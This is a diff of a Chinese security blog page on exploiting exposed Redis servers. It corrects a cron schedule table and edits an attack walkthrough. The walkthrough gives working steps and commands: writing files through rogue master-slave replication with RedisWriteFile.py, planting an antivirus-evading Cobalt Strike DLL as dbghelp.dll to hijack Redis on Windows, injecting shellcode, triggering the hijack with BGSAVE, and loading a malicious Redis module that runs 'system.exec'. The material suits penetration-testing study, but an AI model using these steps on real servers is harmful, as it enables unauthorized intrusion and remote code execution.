@@ -449,7 +449,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    19 分
+                    18 分
                 </div>
                 
 
@@ -611,49 +611,33 @@ bgsave<span aria-hidden="true" class="line-numbers-rows"><span></span><span></sp
 <span class="token comment" spellcheck="true"># │ │ │ │ ┌─星期（0 - 6，表示从周日到周六）</span>
 <span class="token comment" spellcheck="true"># │ │ │ │ │</span>
 <span class="token comment" spellcheck="true"># *  *  *  *  *  用户名 执行的命令</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>系统层次的任务时间表（crontabs）的任务经常会指定一个或以上的用户进行执行，因此任务时间表（crontabs）文件需要增加“用户名”字段。<code>/etc/crontab</code> 文件定期自动执行多个子目录中的项目。放置在不同目录中<code>/etc/cron.*</code>脚本按照下面给出的时间间隔运行。这些目录中的所有脚本都以 root 权限运行。<br>| 目录 | 时间 |<br>| —– | —– |<br>| /etc/cron.d  | 几分钟 |<br>| /etc/cron.hourly |每小时的第一分钟 |<br>| /etc/cron.daily | 每天凌晨 3:05 至晚上 10.55 |<br>| /etc/cron.weekly |自上次执行后 7 天后的上午 3:25 至晚上 11:10 之间 |<br>| /etc/cron.monthly | 自上次执行后一个月后的凌晨 3:45 至晚上 11:30 之间 | </p>
+<p>系统层次的任务时间表（crontabs）的任务经常会指定一个或以上的用户进行执行，因此任务时间表（crontabs）文件需要增加“用户名”字段。<code>/etc/crontab</code> 文件定期自动执行多个子目录中的项目。放置在不同目录中<code>/etc/cron.*</code>脚本按照下面给出的时间间隔运行。这些目录中的所有脚本都以 root 权限运行。</p>
 <table>
 <thead>
 <tr>
-<th>位运算</th>
-<th>符号</th>
-<th>计算</th>
+<th>目录</th>
+<th>时间</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>按位与</td>
-<td>&amp;</td>
-<td>相同为1，不同为0</td>
+<td>/etc/cron.d</td>
+<td>几分钟</td>
 </tr>
 <tr>
-<td>按位或</td>
-<td>|</td>
-<td>有1则1</td>
+<td>/etc/cron.hourly</td>
+<td>每小时的第一分钟</td>
 </tr>
 <tr>
-<td>按位异或</td>
-<td>^</td>
-<td>相同为0，不同位1</td>
+<td>/etc/cron.daily</td>
+<td>每天凌晨 3:05 至晚上 10.55</td>
 </tr>
 <tr>
-<td>按位取反</td>
-<td>~</td>
-<td></td>
+<td>/etc/cron.weekly</td>
+<td>自上次执行后 7 天后的上午 3:25 至晚上 11:10 之间</td>
 </tr>
 <tr>
-<td>左移</td>
-<td>&lt;&lt;</td>
-<td>相当于乘以2^n^</td>
-</tr>
-<tr>
-<td>右移</td>
-<td><code>&gt;&gt;</code></td>
-<td>相当于除以2^n^</td>
-</tr>
-<tr>
-<td>无符号右移</td>
-<td><code>&gt;&gt;&gt;</code></td>
-<td></td>
+<td>/etc/cron.monthly</td>
+<td>自上次执行后一个月后的凌晨 3:45 至晚上 11:30 之间</td>
 </tr>
 </tbody></table>
 <p><code>/var/spool/cron/</code>下的任务时间表（crontab）文件是用户层次的（但是只能root权限建），计划任务文件的名称与用户的用户名相同，格式如下：</p>
@@ -757,19 +741,22 @@ EVAL <span class="token string">"return dofile('C:/Users/Public/Desktop/Notepad+
 <pre class="line-numbers language-python"><code class="language-python">python3 RedisWriteFile<span class="token punctuation">.</span>py <span class="token operator">-</span><span class="token operator">-</span>rhost <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">200.97</span> <span class="token operator">-</span><span class="token operator">-</span>rport <span class="token number">6379</span> <span class="token operator">-</span><span class="token operator">-</span>lhost <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">200.138</span> <span class="token operator">-</span><span class="token operator">-</span>lport <span class="token number">16379</span> <span class="token operator">-</span><span class="token operator">-</span>rpath <span class="token string">"C:/Users/Public/Desktop"</span> <span class="token operator">-</span><span class="token operator">-</span>rfile <span class="token string">"Google Chrome.lnk"</span> <span class="token operator">-</span><span class="token operator">-</span>lfile <span class="token string">"Google Chrome.lnk"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/093ab56ed159388b827b9b47d7f641b7.gif"></p>
 <p><em>快速启动栏</em><br>在文件夹<code>%AppData%\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar</code>中，可以修改，但是测试新增文件并不会在任务栏显示。<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/af92092b9edcc756437a953dc0962cdc.png"></p>
-<p><em>DLL劫持</em><br>开启Process Monitor监控，然后启动Redis，观察到Redis在其安装目录加载了<code>dbghelp.dll</code>和<code>CRYPTBASE.DLL</code>两个DLL,这两个DLL本来是在系统目录中的，加载过程中存在了DLL加载顺序的劫持（DLL劫持相关基础可以查看<a target="_blank" rel="noopener" href="http://xxxxxx/">DLL劫持漏洞</a>）：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/c698ca3d8fc6bf984232694d40a3e131.png"><br>利用之前查看进程的架构，利用的DLL也需要是相同架构：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/2cb69eba140ae0b8ab41cb68f923aad4.png"><br>生成Cobalt Strike的x64 DLL后，直接使用NetClone工具复制出DLL的导出函数进行代理转发：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/7edb112f6328ef400d794b77fe73d4df.png"><br>生成完成后查看DLL架构x64为8664，x86为014C(用记事本打开二进制文件查看字符串64位是<code>PE  d†</code>，32 位是<code>PE L</code>):<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/9956b741c13fd911842ef7a119dad9c8.png"></p>
-<p>参考 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8153?page=3">Redis on Windows 出网利用探索</a> 一文中，DLL劫持还可以由 <code>BGSAVE</code>等命令触发。使用 <a target="_blank" rel="noopener" href="https://github.com/slaeryan/AQUARMOURY/tree/master/Brownie">Brownie</a>来进行DLL的免杀，<a target="_blank" rel="noopener" href="https://github.com/monoxgas/Koppeling">Koppeling</a> 项目来快速进行DLL函数代理转发构建：<br>1.生成Cobalt Strike后门：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/8b422092ae816be1b087546e7cab5b0b.png"><br>2.使用Brownie项目中的AES.py脚本加密Bin输出logo.png：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/5a54ed94e9bbf0458596813450794f48.png"><br>3.在Brownie中配置与加密脚本中一致的AES-KEY。<br>4.DLL中使用<code>CreateProcess</code>和<code>CreateRemoteThread</code>API组合注入shellcode:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/84a5e8c8215a8c38f5104335ef0cd689.png"><br>5.生成项目DLL后使用Koppeling项目中的Python脚本来链接到转发DLL:</p>
+<p><em>DLL劫持</em><br>开启Process Monitor监控，然后启动Redis，观察到Redis在其安装目录加载了<code>dbghelp.dll</code>和<code>CRYPTBASE.DLL</code>两个DLL,这两个DLL本来是在系统目录中的，加载过程中存在了DLL加载顺序的劫持（DLL劫持相关基础可以查看<a target="_blank" rel="noopener" href="http://xxxxxx/">DLL劫持漏洞</a>）：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/c698ca3d8fc6bf984232694d40a3e131.png"><br>查看进程的架构为x64，作为漏洞利用的DLL也需要是相同架构：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/2cb69eba140ae0b8ab41cb68f923aad4.png"></p>
+<p>生成完成后可以使用<code>dumpbin /headers xxx.dll</code>命令确认，或者在010 Editor下打开后查看PE后面的16进制，x64为8664，x86为014C(用记事本打开二进制文件查看字符串64位是<code>PE  d†</code>，32 位是<code>PE L</code>):<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/9956b741c13fd911842ef7a119dad9c8.png"></p>
+<p>参考 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8153?page=3">Redis on Windows 出网利用探索</a> 一文中，DLL劫持可以由 <code>BGSAVE</code>等命令主动触发。生成<code>dbghelp.dll</code>的劫持用到的是 <a target="_blank" rel="noopener" href="https://github.com/slaeryan/AQUARMOURY/tree/master/Brownie">Brownie</a>项目进行DLL的免杀，<a target="_blank" rel="noopener" href="https://github.com/monoxgas/Koppeling">Koppeling</a> 项目进行DLL函数代理转发构建：<br>1.生成Cobalt Strike的x64的DLL：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/8b422092ae816be1b087546e7cab5b0b.png"><br>2.使用Brownie项目中的AES.py脚本加密Bin输出logo.png：<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/5a54ed94e9bbf0458596813450794f48.png"><br>3.在Brownie中配置与加密脚本中一致的AES-KEY。<br>4.DLL中使用<code>CreateProcess</code>和<code>CreateRemoteThread</code>API组合注入shellcode:<br><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/84a5e8c8215a8c38f5104335ef0cd689.png"><br>5.生成项目DLL后使用Koppeling项目中的Python脚本来链接到转发DLL:</p>
 <pre class="line-numbers language-python"><code class="language-python">python3 PyClone<span class="token punctuation">.</span>py AES<span class="token punctuation">.</span>dll C<span class="token punctuation">:</span>\windows\system32\dbghelp<span class="token punctuation">.</span>dll <span class="token operator">-</span>o dbghelp<span class="token punctuation">.</span>dll<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/e4db3f27a21559bd617154e98f92969c.png"><br>6.使用Redis主从同步脚本写入后执行<code>bgsave</code>触发DLL劫持：</p>
 <pre class="line-numbers language-python"><code class="language-python">python3 RedisWriteFile<span class="token punctuation">.</span>py <span class="token operator">-</span><span class="token operator">-</span>rhost <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">200.97</span> <span class="token operator">-</span><span class="token operator">-</span>rport <span class="token number">6379</span> <span class="token operator">-</span><span class="token operator">-</span>lhost <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">200.138</span> <span class="token operator">-</span><span class="token operator">-</span>lport <span class="token number">16379</span> <span class="token operator">-</span><span class="token operator">-</span>rpath <span class="token string">"D:/phpstudy_pro/Extensions/redis3.0.504"</span> <span class="token operator">-</span><span class="token operator">-</span>rfile <span class="token string">"dbghelp.dll"</span> <span class="token operator">-</span><span class="token operator">-</span>lfile <span class="token string">"dbghelp.dll"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/188376a7149dc5dbc46e0a67415437cc.gif"></p>
-<h3 id="Redis模块"><a href="#Redis模块" class="headerlink" title="Redis模块"></a>Redis模块</h3><p>在Redis4.0或更高版本中，支持了自定义<a target="_blank" rel="noopener" href="https://redis.io/modules">模块</a>，可以编写模块来执行命令，GitHub项目<a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">RedisModules-ExecuteCommand</a>。<br>利用主从复制写入文件后使用<code>module load xx.so</code>加载，通过模块扩展进行命令执行等操作，类似MySQL的UDF。操作命令如下:</p>
+<h3 id="Redis模块"><a href="#Redis模块" class="headerlink" title="Redis模块"></a>Redis模块</h3><p>在Redis4.0或更高版本中，支持了自定义<a target="_blank" rel="noopener" href="https://redis.io/modules">模块</a>，可以编写模块来执行命令，参考GitHub项目<a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">RedisModules-ExecuteCommand</a>。<br>利用主从复制写入文件后使用<code>module load xx.so</code>加载，通过模块扩展进行命令执行等操作，类似MySQL的UDF。操作命令如下:</p>
 <pre class="line-numbers language-python"><code class="language-python">config set dir <span class="token operator">/</span>tmp
 config set dbfilename system<span class="token punctuation">.</span>so
 slaveof <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">11.1</span> <span class="token number">16379</span>  
 module load <span class="token operator">/</span>tmp<span class="token operator">/</span>exp<span class="token punctuation">.</span>so
 slaveof no one 
-system<span class="token punctuation">.</span><span class="token keyword">exec</span> <span class="token string">'id'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+system<span class="token punctuation">.</span><span class="token keyword">exec</span> <span class="token string">'id'</span>
+<span class="token comment" spellcheck="true">#module  list #列出加载的模块</span>
+<span class="token comment" spellcheck="true">#module unload xxx #根据list列出的名称卸载模块</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>用RedisWriteFile脚本增加自动命令执行：</p>
 <pre class="line-numbers language-python"><code class="language-python">python3 RedisWriteFile<span class="token punctuation">.</span>py <span class="token operator">-</span><span class="token operator">-</span>rhost <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">11.133</span> <span class="token operator">-</span><span class="token operator">-</span>rport <span class="token number">6379</span> <span class="token operator">-</span><span class="token operator">-</span>lhost <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">11.1</span> <span class="token operator">-</span><span class="token operator">-</span>lport <span class="token number">16379</span> <span class="token operator">-</span><span class="token operator">-</span>rpath <span class="token string">"/tmp"</span> <span class="token operator">-</span><span class="token operator">-</span>rfile system<span class="token punctuation">.</span>so <span class="token operator">-</span><span class="token operator">-</span>lfile system<span class="token punctuation">.</span>so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/saymehi/images_depository@latest/2021_10/80a9d6fc69b3481dcf76d78ab3e90615.png"></p>
